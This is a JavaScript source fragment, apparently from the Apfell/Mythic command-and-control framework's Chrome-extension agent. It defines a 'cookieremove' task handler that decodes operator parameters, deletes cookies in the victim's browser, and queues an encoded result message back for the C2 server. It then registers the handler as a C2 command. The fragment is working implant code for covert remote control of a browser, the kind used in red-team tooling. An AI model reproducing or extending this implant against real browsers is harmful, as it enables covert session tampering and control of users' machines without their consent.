cookieremove = function(params) {
    let details = JSON.parse(atob(params['data'].toString()));
    let taskid = params['taskid'];
    let tasktype = params['tasktype'];
    chrome.cookies.remove(details, function(cookie){
        let resp;
        if (cookie === null) {
            resp = JSON.stringify(chrome.runtime.lastError);
        } else {
            resp = JSON.stringify(cookie, null, 2);
        }

        const data = btoa(unescape(encodeURIComponent(resp)));
        const apfellMsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
        let meta = {};
        meta["metatype"] = 3;
        meta["metadata"] = apfellMsg;
        const metaenvelope = JSON.stringify(meta);
        out.push(metaenvelope);
    });

};


C2.commands[cookieremove.name] = cookieremove;
COMMAND_ENDS_HERE
